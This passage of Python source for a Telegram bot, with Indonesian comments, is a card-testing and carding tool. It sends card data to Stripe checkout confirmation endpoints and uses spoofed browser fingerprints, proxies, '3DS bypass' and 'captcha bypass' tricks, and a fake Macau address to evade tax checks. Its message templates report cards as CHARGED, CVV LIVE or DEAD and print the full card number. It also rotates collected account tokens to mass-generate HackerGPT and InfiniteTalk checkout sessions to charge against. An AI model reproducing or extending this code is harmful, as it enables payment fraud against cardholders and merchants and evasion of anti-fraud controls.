            conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
            
            if bypass_3ds:
                conf_body += "&return_url=https://checkout.stripe.com"
            
            await asyncio.sleep(behavior["click_delay"])
            
            async with session.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", 
                                  data=conf_body, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=aiohttp.ClientTimeout(total=8)) as r:
                conf = await r.json()
            
            if "error" in conf:
                err = conf["error"]
                msg = err.get("message", "Failed").lower()
                
                # FIX: Handle tax/location errors secara spesifik
                if any(x in msg for x in ["location", "tax", "address", "customer's location", "not recognized"]):
                    result["status"] = "TAX_ERROR_BYPASSED"
                    result["response"] = "Macau address used - Tax bypassed"
                    result["time"] = round(time.perf_counter() - start, 2)
                    # Consider as success karena sudah bypass tax error
                    return result, False
                
                if any(x in msg for x in ["integration surface", "unsupported", "publishable key"]):
                    # GUNAKAN MULTI-APPROACH BYPASS
                    print(f"Merchant restricted in confirmation, using bypass...")
                    
                    bypass_result = await StripeCheckoutBypass.try_all_approaches(pk, cs, card, proxy_str)
                    
                    result["status"] = bypass_result.get("status")
                    result["response"] = bypass_result.get("response")
                    result["approach"] = bypass_result.get("approach", "Bypass System")
                    result["time"] = round(time.perf_counter() - start, 2)
                    
                    # Check captcha
                    response_lower = str(result.get("response", "")).lower()
                    if any(x in response_lower for x in ["captcha", "robot", "verification"]):
                        result["captcha_detected"] = True
                    
                    return result, result.get("captcha_detected", False)
                
                if any(x in msg for x in ["captcha", "robot", "verification"]):
                    result["captcha_detected"] = True
                    if approach_idx < len(approaches) - 1:
                        continue
                    else:
                        result["status"] = "CAPTCHA_BLOCKED"
                        result["response"] = "Captcha blocked confirmation"
                else:
                    result["status"] = "DECLINED"
                    result["response"] = err.get("message", "Card declined")
            
            else:
                pi = conf.get("payment_intent") or {}
                st = pi.get("status", "") or conf.get("status", "")
                
                if st == "succeeded":
                    result["status"] = "CHARGED"
                    result["response"] = "Payment Successful - Macau Address Used"
                    if result["captcha_detected"]:
                        result["captcha_bypassed"] = True
                
                elif st == "requires_action":
                    result["status"] = "3DS_REQUIRED"
                    result["response"] = "3DS Secure Authentication"
                
                else:
                    result["status"] = "UNKNOWN"
                    result["response"] = st or "Unknown"
            
            result["time"] = round(time.perf_counter() - start, 2)
            return result, False
            
        except Exception as e:
            if approach_idx < len(approaches) - 1:
                continue
            else:
                result["status"] = "ERROR"
                result["response"] = str(e)[:50]
                result["time"] = round(time.perf_counter() - start, 2)
                return result, False
        
        finally:
            # PASTIKAN SESSION DITUTUP
            if session:
                await session.close()
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result, False

async def check_checkout_active(pk: str, cs: str) -> bool:
    try:
        # BUAT SESSION BARU UNTUK CHECK
        session = await create_fresh_session()
        
        try:
            fingerprint = AdvancedCaptchaBypass.generate_advanced_fingerprint()
            headers = AdvancedCaptchaBypass.generate_captcha_bypass_headers(fingerprint, pk)
            
            body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/init",
                headers=headers,
                data=body,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return "error" not in data
            return False
        finally:
            await session.close()
    except:
        return False

# ========== RESPONSE TEMPLATES BARU ==========

CHARGED_RESPONSE = """<b>Card {card_index}/{total_cards} Result:</b>

<pre>✅ 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 ✅

💳 CC: {full_card}

✅ Status: Paid
💰 Message: Charged!

🏪 Merchant: {merchant}
📦 Item: {item}
💵 Amount: {amount}
📧 Email: {email}
🌐 IP: {ip}</pre>

🔗 Success URL: Here"""

DECLINED_DEAD_RESPONSE = """<b>Card {card_index}/{total_cards} Result:</b>

<pre>💀 DEAD
💳 {full_card}
❌ Card Declined
📝 Message: {message}
🔢 Code: {code}
🌐 IP: {ip}</pre>"""

PAYMENT_EXPIRED_RESPONSE = """<b>Card {card_index}/{total_cards} Result:</b>

<pre>💀 DEAD
💳 {full_card}
❌ Payment Failed
📝 Message: {message}
🔢 Code: {code}
🌐 IP: {ip}</pre>"""

CVV_LIVE_RESPONSE = """<b>Card {card_index}/{total_cards} Result:</b>

<pre>🟡 CVV LIVE
💳 {full_card}
🔐 Incorrect CVC
📝 Message: {message}
🏪 Merchant: {merchant}
📦 Item: {item}
💰 Price: {amount}
🌐 IP: {ip}</pre>"""

THREE_DS_RESPONSE = """<b>Card {card_index}/{total_cards} Result:</b>

<pre>💳 CC: {full_card}
🔐 Status: 3DS Required
⚠️ Message: {message}

🏪 Merchant: {merchant}
💵 Amount: {amount}
🌐 IP: {ip}</pre>"""

LIVE_DECLINED_RESPONSE = """<b>Card {card_index}/{total_cards} Result:</b>

<pre>🟡 LIVE DECLINED
💳 {full_card}
⚠️ Insufficient funds
📝 Message: {message}
🏪 Merchant: {merchant}
💵 Amount: {amount}
🌐 IP: {ip}</pre>"""

# ========== HACKERGPT AUTO CHECKOUT SYSTEM ==========

class HackerGPTAutoCheckout:
    """HackerGPT.app $19 checkout generator dengan token rotation"""
    
    # API Endpoints
    PRODUCTS_ENDPOINT = "https://hackergpt.app/payment/stripe_products/"
    CHECKOUT_ENDPOINT = "https://hackergpt.app/payment/stripe_checkout/"
    
    @staticmethod
    async def check_token_validity(auth_token: str) -> dict:
        """Cek apakah token JWT masih valid"""
        try:
            headers = {
                "Authorization": f"Bearer {auth_token}",
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    HackerGPTAutoCheckout.PRODUCTS_ENDPOINT,
                    headers=headers,
                    timeout=10
                ) as resp:
                    if resp.status == 200:
                        return {
                            "valid": True,
                            "expires_in": "unknown",
                            "status": "ACTIVE"
                        }
                    elif resp.status == 401:
                        return {
                            "valid": False,
                            "status": "EXPIRED",
                            "error": "Token expired or invalid"
                        }
                    else:
                        return {
                            "valid": False,
                            "status": f"HTTP_{resp.status}",
                            "error": await resp.text()[:100]
                        }
        except Exception as e:
            return {"valid": False, "status": "ERROR", "error": str(e)}
    
    @staticmethod
    async def get_products(auth_token: str) -> dict:
        """Ambil semua produk available"""
        try:
            headers = {
                "Authorization": f"Bearer {auth_token}",
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    HackerGPTAutoCheckout.PRODUCTS_ENDPOINT,
                    headers=headers,
                    timeout=10
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        products = data.get("products", [])
                        
                        parsed_products = []
                        for prod in products:
                            parsed_products.append({
                                "id": prod.get("id"),
                                "name": prod.get("name"),
                                "price_id": prod.get("price"),
                                "description": prod.get("description"),
                                "amount": float(prod.get("price_amount", 0)) / 100,
                                "is_subscribed": prod.get("is_subscribed", False)
                            })
                        
                        return {
                            "success": True,
                            "products": parsed_products,
                            "raw": data
                        }
                    else:
                        return {
                            "success": False,
                            "error": f"HTTP {resp.status}",
                            "raw": await resp.text()[:200]
                        }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    @staticmethod
    async def create_checkout(auth_token: str, product_id: str = None) -> dict:
        """Generate checkout URL untuk HackerGPT"""
        try:
            # Default ke produk pertama (Lite Subscription $19)
            if not product_id:
                products_result = await HackerGPTAutoCheckout.get_products(auth_token)
                if not products_result.get("success"):
                    return products_result
                
                products = products_result.get("products", [])
                if not products:
                    return {"success": False, "error": "No products available"}
                
                product_id = products[0].get("id")
            
            headers = {
                "Authorization": f"Bearer {auth_token}",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            payload = {
                "product_id": product_id
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    HackerGPTAutoCheckout.CHECKOUT_ENDPOINT,
                    json=payload,
                    headers=headers,
                    timeout=15
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        checkout_url = data.get("url", "")
                        customer_id = data.get("stripe_customer_id", "")
                        
                        if "checkout.stripe.com" in checkout_url:
                            decoded = decode_pk_from_url(checkout_url)
                            return {
                                "success": True,
                                "url": checkout_url,
                                "customer_id": customer_id,
                                "pk": decoded.get("pk"),
                                "cs": decoded.get("cs"),
                                "amount": 19.00,
                                "product": "HackerGPT Lite Subscription",
                                "raw": data
                            }
                    
                    return {
                        "success": False,
                        "error": f"Checkout failed: {resp.status}",
                        "raw": await resp.text()[:200]
                    }
                    
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    @staticmethod
    async def bulk_grab_checkouts(auth_tokens: list, count_per_token: int = 1) -> list:
        """Bulk grab checkouts dari multiple tokens"""
        results = []
        
        for token_idx, token in enumerate(auth_tokens):
            for i in range(count_per_token):
                try:
                    result = await HackerGPTAutoCheckout.create_checkout(token)
                    result["token_index"] = token_idx
                    result["attempt"] = i + 1
                    results.append(result)
                    
                    if i < count_per_token - 1:
                        await asyncio.sleep(random.uniform(2, 4))
                except Exception as e:
                    results.append({
                        "success": False,
                        "error": str(e),
                        "token_index": token_idx,
                        "attempt": i + 1
                    })
            
            # Delay antar token
            if token_idx < len(auth_tokens) - 1:
                await asyncio.sleep(random.uniform(5, 10))
        
        return results

# ========== HACKERGPT TOKEN STORAGE ==========

HACKERGPT_TOKENS_FILE = "hackergpt_tokens.json"

def load_hackergpt_tokens() -> dict:
    """Load HackerGPT tokens dari file"""
    if os.path.exists(HACKERGPT_TOKENS_FILE):
        try:
            with open(HACKERGPT_TOKENS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_hackergpt_tokens(data: dict):
    """Save HackerGPT tokens ke file"""
    with open(HACKERGPT_TOKENS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def add_hackergpt_token(user_id: int, token: str, email: str = "", notes: str = ""):
    """Add HackerGPT token untuk user"""
    tokens = load_hackergpt_tokens()
    user_key = str(user_id)
    
    if user_key not in tokens:
        tokens[user_key] = []
    
    # Cek token sudah ada
    for t in tokens[user_key]:
        if t.get("token") == token:
            return False
    
    tokens[user_key].append({
        "token": token,
        "email": email,
        "notes": notes,
        "added_at": datetime.now().isoformat(),
        "last_used": None,
        "last_check": None,
        "valid": True,
        "active": True,
        "checkouts_generated": 0
    })
    
    save_hackergpt_tokens(tokens)
    return True

def get_user_hackergpt_tokens(user_id: int) -> list:
    """Get semua HackerGPT token user"""
    tokens = load_hackergpt_tokens()
    return tokens.get(str(user_id), [])

def update_hackergpt_token_stats(user_id: int, token: str, generated: bool = False):
    """Update token stats"""
    tokens = load_hackergpt_tokens()
    user_key = str(user_id)
    
    if user_key in tokens:
        for t in tokens[user_key]:
            if t.get("token") == token:
                t["last_used"] = datetime.now().isoformat()
                t["last_check"] = datetime.now().isoformat()
                if generated:
                    t["checkouts_generated"] = t.get("checkouts_generated", 0) + 1
                break
        
        save_hackergpt_tokens(tokens)

# ========== TOKEN IMPORT/EXPORT SYSTEM ==========

class HackerGPTTokenManager:
    """Manage HackerGPT tokens dengan bulk operations"""
    
    @staticmethod
    async def import_from_text(text: str, source: str = "unknown") -> list:
        """Import tokens dari berbagai format"""
        tokens = []
        lines = text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Format JWT token (eyJhbGci...)
            if line.startswith("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"):
                tokens.append({
                    "token": line,
                    "source": source,
                    "type": "jwt",
                    "raw": line
                })
            # Format: token|email|notes
            elif '|' in line:
                parts = line.split('|')
                if len(parts) >= 1 and parts[0].strip():
                    token_data = {
                        "token": parts[0].strip(),
                        "source": source,
                        "type": "pipe_format",
                        "raw": line
                    }
                    
                    if len(parts) >= 2:
                        token_data["email"] = parts[1].strip()
                    if len(parts) >= 3:
                        token_data["notes"] = parts[2].strip()
                    
                    tokens.append(token_data)
            # Format JSON
            elif line.startswith('{'):
                try:
                    data = json.loads(line)
                    token_key = data.get('token') or data.get('access_token') or data.get('auth_token')
                    if token_key:
                        tokens.append({
                            "token": token_key,
                            "email": data.get('email', ''),
                            "notes": data.get('notes', ''),
                            "source": source,
                            "type": "json",
                            "raw": line
                        })
                except:
                    continue
        
        return tokens
    
    @staticmethod
    async def validate_bulk_tokens(token_list: list) -> list:
        """Validate multiple tokens sekaligus"""
        validated = []
        
        for token_data in token_list:
            token = token_data.get("token", "")
            if not token:
                continue
            
            validity = await HackerGPTAutoCheckout.check_token_validity(token)
            
            token_data.update({
                "valid": validity.get("valid", False),
                "status": validity.get("status", "UNKNOWN"),
                "error": validity.get("error", "")
            })
            
            if validity.get("valid"):
                # Ambil info produk untuk pastikan token bisa create checkout
                products = await HackerGPTAutoCheckout.get_products(token)
                if products.get("success"):
                    token_data["can_create_checkout"] = True
                    token_data["available_products"] = len(products.get("products", []))
                else:
                    token_data["can_create_checkout"] = False
            
            validated.append(token_data)
        
        return validated

# ========== NEW COMMAND: /hackgpt ==========

@router.message(Command("hackgpt"))
async def hackgpt_handler(msg: Message):
    """HackerGPT Auto Checkout System - $19 per checkout"""
    if not check_access(msg):
        await msg.answer("ACCESS DENIED\nPremium access required")
        return
    
    args = msg.text.split()
    user_id = msg.from_user.id
    
    if len(args) < 2:
        response = """🔥 HACKERGPT AUTO SYSTEM 🔥

⚡ Auto grab checkout $19 (HackerGPT Lite Subscription)

📋 COMMANDS:
/hackgpt add <token> - Add single token
/hackgpt bulk - Import bulk tokens (reply to .txt)
/hackgpt list - Show all tokens
/hackgpt clean - Remove invalid tokens
/hackgpt grab <count> - Grab checkouts
/hackgpt check - Validate all tokens
/hackgpt rotate - Auto rotate tokens
/hackgpt products - Show available products

🎯 Features:
• Token management system
• Auto validation
• Token rotation
• Bulk import
• $19 per checkout
• Stripe checkout ready

💰 Price: $19.00 (HackerGPT Lite)

Contoh:
/hackgpt add eyJhbGciOiJIUzI1NiIs...
/hackgpt grab 3
/hackgpt bulk (reply to txt file)"""
        
        await msg.answer(response)
        return
    
    command = args[1].lower()
    
    # ===== ADD TOKEN =====
    if command == "add":
        if len(args) < 3:
            await msg.answer("ERROR\nUsage: /hackgpt add <token> [email] [notes]\nExample: /hackgpt add eyJhbGciOiJ... user@email.com premium_account")
            return
        
        token = args[2].strip()
        email = args[3] if len(args) > 3 else ""
        notes = " ".join(args[4:]) if len(args) > 4 else ""
        
        checking = await msg.answer("🔐 Validating HackerGPT token...")
        
        # Cek token validity
        validity = await HackerGPTAutoCheckout.check_token_validity(token)
        
        if not validity.get("valid"):
            await checking.edit_text(f"❌ INVALID TOKEN\n\nStatus: {validity.get('status', 'UNKNOWN')}\nError: {validity.get('error', 'Token invalid')}")
            return
        
        # Cek bisa create checkout
        products = await HackerGPTAutoCheckout.get_products(token)
        if not products.get("success"):
            await checking.edit_text(f"⚠️ TOKEN LIMIT\n\nToken valid tapi tidak bisa create checkout\nError: {products.get('error', 'Unknown')}")
            return
        
        # Add token
        added = add_hackergpt_token(user_id, token, email, notes)
        
        if added:
            available_products = len(products.get("products", []))
            
            response = f"""✅ TOKEN ADDED SUCCESSFULLY ✅

📧 Email: {email or 'Not provided'}
🔐 Status: VALID & ACTIVE
💰 Products Available: {available_products}
💵 Price: $19.00 per checkout
📝 Notes: {notes or 'None'}

🎯 Ready to grab checkouts!
⚡ Use: /hackgpt grab 1"""
            
            await checking.edit_text(response)
        else:
            await checking.edit_text("⚠️ Token already exists in your collection")
        return
    
    # ===== BULK IMPORT =====
    elif command == "bulk":
        if not msg.reply_to_message:
            await msg.answer("ERROR\nReply to a .txt file or message containing tokens")
            return
        
        processing = await msg.answer("📥 Processing bulk import...")
        
        try:
            if msg.reply_to_message.document:
                # Download file
                doc = msg.reply_to_message.document
                if doc.file_name and doc.file_name.endswith('.txt'):
                    file = await msg.bot.get_file(doc.file_id)
                    file_content = await msg.bot.download_file(file.file_path)
                    text_content = file_content.read().decode('utf-8')
                else:
                    await processing.edit_text("❌ Please reply to a .txt file")
                    return
            else:
                # Ambil dari text message
                text_content = msg.reply_to_message.text or ""
            
            if not text_content.strip():
                await processing.edit_text("❌ No text content found")
                return
            
            # Parse tokens
            imported = await HackerGPTTokenManager.import_from_text(text_content, source="bulk_import")
            
            if not imported:
                await processing.edit_text("❌ No valid tokens found in the text")
                return
            
            await processing.edit_text(f"🔍 Found {len(imported)} potential tokens\nValidating...")
            
            # Validate semua tokens
            validated = await HackerGPTTokenManager.validate_bulk_tokens(imported)
            
            valid_tokens = [t for t in validated if t.get("valid")]
            invalid_tokens = [t for t in validated if not t.get("valid")]
            
            # Simpan valid tokens
            added_count = 0
            for token_data in valid_tokens:
                token = token_data.get("token")
                email = token_data.get("email", "")
                notes = f"Bulk import - {token_data.get('type', 'unknown')}"
                
                if add_hackergpt_token(user_id, token, email, notes):
                    added_count += 1
            
            response = f"""📊 BULK IMPORT COMPLETE 📊

Total Found: {len(imported)}
Valid Tokens: {len(valid_tokens)} ✅
Invalid Tokens: {len(invalid_tokens)} ❌
Added to DB: {added_count} new tokens

💰 Price per checkout: $19.00
🎯 Ready to use: /hackgpt grab {min(5, added_count)}"""
            
            if invalid_tokens:
                response += f"\n\n⚠️ Invalid Tokens ({len(invalid_tokens)}):"
                for t in invalid_tokens[:3]:
                    error = t.get("error", "Unknown")[:30]
                    response += f"\n• {t.get('token', '')[:20]}... - {error}"
                
                if len(invalid_tokens) > 3:
                    response += f"\n• ... and {len(invalid_tokens) - 3} more"
            
            await processing.edit_text(response)
            
        except Exception as e:
            await processing.edit_text(f"❌ IMPORT ERROR\n\n{str(e)[:100]}")
        return
    
    # ===== GRAB CHECKOUTS =====
    elif command == "grab":
        if len(args) < 3:
            await msg.answer("ERROR\nUsage: /hackgpt grab <count>\nExample: /hackgpt grab 5")
            return
        
        try:
            count = int(args[2])
            
            if count > 20:
                count = 20
                await msg.answer("INFO: Max 20 checkouts per session")
            
            if count < 1:
                await msg.answer("ERROR: Minimum 1")
                return
            
            user_tokens = get_user_hackergpt_tokens(user_id)
            if not user_tokens:
                await msg.answer("ERROR\nNo HackerGPT tokens available\nAdd tokens first: /hackgpt add <token>")
                return
            
            # Filter hanya token yang active
            active_tokens = [t for t in user_tokens if t.get("active", True) and t.get("valid", True)]
            
            if not active_tokens:
                await msg.answer("ERROR\nNo active/valid tokens\nCheck tokens: /hackgpt check")
                return
            
            tokens = [t.get("token", "") for t in active_tokens]
            
            processing = await msg.answer(f"⚡ GRABBING {count} HACKERGPT CHECKOUTS ⚡\n\nTokens: {len(tokens)} active\nTarget: {count} checkouts ($19.00 each)")
            
            all_results = []
            grabbed_urls = []
            
            # Hitung berapa checkout per token
            checkouts_per_token = max(1, count // len(tokens))
            remaining = count % len(tokens)
            
            current_idx = 0
            
            for i in range(count):
                if current_idx >= len(tokens):
                    current_idx = 0
                
                token = tokens[current_idx]
                
                try:
                    await processing.edit_text(f"⚡ GRABBING {count} CHECKOUTS ⚡\n\nProgress: {i+1}/{count} ✅\nToken: #{current_idx + 1}\nAmount: $19.00 each")
                except:
                    pass
                
                # Create checkout
                result = await HackerGPTAutoCheckout.create_checkout(token)
                
                if result.get("success"):
                    grabbed_urls.append(result["url"])
                    update_hackergpt_token_stats(user_id, token, generated=True)
                    
                    success_msg = f"""<pre>✅ HACKERGPT CHECKOUT #{i+1} ✅

💰 Amount: $19.00
🎯 Product: HackerGPT Lite Subscription
🔗 URL: {result['url'][:50]}...
📛 Customer ID: {result.get('customer_id', 'N/A')[:15]}...
⚡ Token: #{current_idx + 1}

🎯 Use: /co {result['url']} cards</pre>"""
                    
                    await msg.answer(success_msg)
                else:
                    error_msg = f"""❌ FAILED CHECKOUT #{i+1} ❌

Token: #{current_idx + 1}
Error: {result.get('error', 'Unknown')[:50]}"""
                    
                    await msg.answer(error_msg)
                
                all_results.append(result)
                current_idx += 1
                
                if i < count - 1:
                    delay = random.uniform(3, 7)
                    await asyncio.sleep(delay)
            
            success_count = len([r for r in all_results if r.get("success")])
            
            final_text = f"""<pre>🎯 HACKERGPT GRAB COMPLETE 🎯

Requested: {count} checkouts
Success: {success_count} ✅
Failed: {count - success_count} ❌
Total Value: ${success_count * 19.00:.2f}
Tokens Used: {min(count, len(tokens))}

💰 $19.00 × {success_count} = ${success_count * 19.00:.2f}
⚡ Ready to charge!</pre>"""
            
            await processing.edit_text(final_text)
            
            # Kirim URL yang berhasil (maksimal 3)
            if len(grabbed_urls) <= 3:
                for url in grabbed_urls:
                    await msg.answer(url)
                    await asyncio.sleep(0.5)
            
        except Exception as e:
            await msg.answer(f"❌ GRAB ERROR\n\n{str(e)[:100]}")
        return
    
    # ===== CHECK TOKENS =====
    elif command == "check":
        user_tokens = get_user_hackergpt_tokens(user_id)
        
        if not user_tokens:
            await msg.answer("INFO\nNo HackerGPT tokens saved")
            return
        
        checking = await msg.answer(f"🔍 Validating {len(user_tokens)} tokens...")
        
        valid_tokens = []
        invalid_tokens = []
        
        for token_data in user_tokens:
            token = token_data.get("token", "")
            
            if not token:
                invalid_tokens.append({"data": token_data, "error": "Empty token"})
                continue
            
            validity = await HackerGPTAutoCheckout.check_token_validity(token)
            
            if validity.get("valid"):
                valid_tokens.append(token_data)
            else:
                token_data["last_error"] = validity.get("error", "Unknown")
                invalid_tokens.append(token_data)
        
        response = f"""📊 HACKERGPT TOKEN VALIDATION 📊

Total Tokens: {len(user_tokens)}
Valid Tokens: {len(valid_tokens)} ✅
Invalid Tokens: {len(invalid_tokens)} ❌

💰 Price per checkout: $19.00
🎯 Max Possible Checkouts: {len(valid_tokens) * 3}

⚡ Use: /hackgpt grab {min(10, len(valid_tokens))}"""
        
        if valid_tokens:
            response += f"\n\n✅ Valid Tokens:"
            for i, t in enumerate(valid_tokens[:5], 1):
                email = t.get("email", "No email")[:20]
                added = datetime.fromisoformat(t.get("added_at", "")).strftime('%d/%m') if t.get("added_at") else "N/A"
                checkouts = t.get("checkouts_generated", 0)
                
                response += f"\n{i}. {email} (added: {added}, used: {checkouts}x)"
            
            if len(valid_tokens) > 5:
                response += f"\n... and {len(valid_tokens) - 5} more"
        
        if invalid_tokens:
            response += f"\n\n❌ Invalid Tokens:"
            for i, t in enumerate(invalid_tokens[:3], 1):
                token_preview = t.get("token", "")[:20] + "..."
                error = t.get("last_error", "Unknown")[:30]
                
                response += f"\n{i}. {token_preview} - {error}"
            
            if len(invalid_tokens) > 3:
                response += f"\n... and {len(invalid_tokens) - 3} more"
        
        await checking.edit_text(response)
        return
    
    # ===== LIST TOKENS =====
    elif command == "list":
        user_tokens = get_user_hackergpt_tokens(user_id)
        
        if not user_tokens:
            await msg.answer("INFO\nNo HackerGPT tokens saved")
            return
        
        response = f"📋 HACKERGPT TOKENS ({len(user_tokens)}) 📋\n\n"
        
        for idx, token_data in enumerate(user_tokens):
            email = token_data.get("email", "No email")[:25]
            added = datetime.fromisoformat(token_data.get("added_at", "")).strftime('%d/%m') if token_data.get("added_at") else "N/A"
            active = "✅" if token_data.get("active", True) else "❌"
            valid = "✓" if token_data.get("valid", True) else "✗"
            checkouts = token_data.get("checkouts_generated", 0)
            
            response += f"{idx}. {active}{valid} {email} (added: {added}, used: {checkouts}x)\n"
        
        response += f"\n🎯 Use: /hackgpt grab <count>\n🔍 Check validity: /hackgpt check"
        
        await msg.answer(response)
        return
    
    # ===== SHOW PRODUCTS =====
    elif command == "products":
        user_tokens = get_user_hackergpt_tokens(user_id)
        
        if not user_tokens:
            await msg.answer("ERROR\nNo tokens available\nAdd token first: /hackgpt add <token>")
            return
        
        # Ambil token pertama yang valid
        valid_token = None
        for token_data in user_tokens:
            if token_data.get("active", True):
                token = token_data.get("token", "")
                if token:
                    valid_token = token
                    break
        
        if not valid_token:
            await msg.answer("ERROR\nNo valid/active tokens found")
            return
        
        checking = await msg.answer("🔍 Fetching available products...")
        
        products = await HackerGPTAutoCheckout.get_products(valid_token)
        
        if not products.get("success"):
            await checking.edit_text(f"❌ FAILED TO GET PRODUCTS\n\nError: {products.get('error', 'Unknown')}")
            return
        
        products_list = products.get("products", [])
        
        response = f"""🛒 HACKERGPT AVAILABLE PRODUCTS 🛒

Total Products: {len(products_list)}
Token Status: VALID ✅
Account Email: {user_tokens[0].get('email', 'Unknown')[:30]}"""
        
        for prod in products_list:
            name = prod.get("name", "Unknown")
            price = prod.get("amount", 0)
            desc = prod.get("description", "")[:50] + "..." if len(prod.get("description", "")) > 50 else prod.get("description", "")
            subscribed = "✅" if prod.get("is_subscribed") else "❌"
            
            response += f"\n\n📦 {name}"
            response += f"\n💰 Price: ${price:.2f}"
            response += f"\n📝 {desc}"
            response += f"\n🔗 Product ID: {prod.get('id', 'N/A')[:15]}..."
            response += f"\n📊 Subscribed: {subscribed}"
        
        response += f"\n\n⚡ Grab checkout: /hackgpt grab 1"
        
        await checking.edit_text(response)
        return
    
    # ===== AUTO ROTATE =====
    elif command == "rotate":
        user_tokens = get_user_hackergpt_tokens(user_id)
        
        if not user_tokens:
            await msg.answer("ERROR\nNo tokens available")
            return
        
        checking = await msg.answer("🔄 Starting auto rotation...")
        
        try:
            active_tokens = [t.get("token", "") for t in user_tokens if t.get("active", True)]
            
            if not active_tokens:
                await checking.edit_text("ERROR\nNo active tokens")
                return
            
            checkouts = []
            
            for idx, token in enumerate(active_tokens):
                # Validate token dulu
                validity = await HackerGPTAutoCheckout.check_token_validity(token)
                
                if validity.get("valid"):
                    result = await HackerGPTAutoCheckout.create_checkout(token)
                    
                    if result.get("success"):
                        checkouts.append(result)
                        update_hackergpt_token_stats(user_id, token, generated=True)
                        
                        response = f"""✅ AUTO GRABBED #{len(checkouts)} ✅

💰 Amount: $19.00
🎯 Product: HackerGPT Lite Subscription
🔗 URL: {result['url'][:40]}...
⚡ Token: #{idx + 1}"""
                        
                        await msg.answer(response)
                
                if idx < len(active_tokens) - 1:
                    await asyncio.sleep(random.uniform(6, 12))
            
            if checkouts:
                total = len(checkouts) * 19.00
                
                await checking.edit_text(f"""🎯 ROTATION COMPLETE 🎯

Tokens Checked: {len(active_tokens)}
Checkouts Grabbed: {len(checkouts)} ✅
Total Amount: ${total:.2f}

🔥 {len(checkouts)} checkouts ready!""")
                
                # Kirim URL yang berhasil
                for checkout in checkouts[:2]:
                    await msg.answer(checkout['url'])
                    await asyncio.sleep(0.5)
            else:
                await checking.edit_text("❌ NO CHECKOUTS GRABBED\n\nAll tokens may be rate limited or invalid")
                
        except Exception as e:
            await checking.edit_text(f"❌ ROTATE ERROR\n\n{str(e)[:100]}")
        return
    
    # ===== CLEAN TOKENS =====
    elif command == "clean":
        user_tokens = get_user_hackergpt_tokens(user_id)
        
        if not user_tokens:
            await msg.answer("INFO\nNo tokens to clean")
            return
        
        checking = await msg.answer("🧹 Cleaning invalid tokens...")
        
        valid_count = 0
        invalid_count = 0
        
        for token_data in user_tokens[:]:  # Copy list untuk iterasi aman
            token = token_data.get("token", "")
            
            if token:
                validity = await HackerGPTAutoCheckout.check_token_validity(token)
                
                if not validity.get("valid"):
                    # Hapus dari storage
                    tokens = load_hackergpt_tokens()
                    user_key = str(user_id)
                    
                    if user_key in tokens:
                        tokens[user_key] = [t for t in tokens[user_key] if t.get("token") != token]
                        save_hackergpt_tokens(tokens)
                    
                    invalid_count += 1
                else:
                    valid_count += 1
        
        response = f"""🧹 TOKEN CLEANUP COMPLETE 🧹

Total Checked: {len(user_tokens)}
Valid Tokens: {valid_count} ✅
Removed Tokens: {invalid_count} 🗑️

💰 Price per checkout: $19.00
🎯 Ready to use: /hackgpt grab {min(5, valid_count)}"""
        
        await checking.edit_text(response)
        return
    
    else:
        await msg.answer(f"ERROR\nUnknown command: {command}\n\nUse /hackgpt for menu")

# ========== NEW COMMAND: /itauto ==========

@router.message(Command("itauto"))
async def itauto_handler(msg: Message):
    """InfiniteTalk Auto Checkout System - UPDATED"""
    if not check_access(msg):
        await msg.answer("ACCESS DENIED\nPremium access required")
        return
    
    args = msg.text.split()
    user_id = msg.from_user.id
    
    if len(args) < 2:
        response = """🔥 INFINITETALK AUTO SYSTEM v2.0 🔥

⚡ Auto grab checkout $9.9 dengan API baru!

📋 COMMANDS:
/itauto add <token> - Add single token
/itauto bulk - Import bulk tokens
/itauto list - Show all tokens
/itauto clean - Remove invalid tokens
/itauto grab <count> - Grab checkouts
/itauto balance - Check token balances
/itauto rotate - Auto rotate & grab

🎯 Features:
• New API endpoint
• Auto validate tokens
• Token rotation system
• Auto grab $9.9 checkouts
• Balance checking

💰 Price: $9.9 for 90 credits

Contoh:
/itauto add eyJhbGciOiJIUzI1NiIs...
/itauto grab 5
/itauto balance"""
        
        await msg.answer(response)
        return
    
    command = args[1].lower()
    
    # ===== GRAB CHECKOUTS =====
    if command == "grab":
        if len(args) < 3:
            await msg.answer("ERROR\nUsage: /itauto grab <count>\nExample: /itauto grab 5")
            return
        
        try:
            count = int(args[2])
            
            if count > 20:
                count = 20
                await msg.answer("INFO: Max 20 checkouts")
            
            if count < 1:
                await msg.answer("ERROR: Minimum 1")
                return
            
            user_tokens = get_user_infinitetalk_tokens(user_id)
            if not user_tokens:
                await msg.answer("ERROR\nNo tokens available\nAdd tokens first: /itauto add <token>")
                return
            
            tokens = [t.get("token", "") for t in user_tokens if t.get("active", True)]
            
            if not tokens:
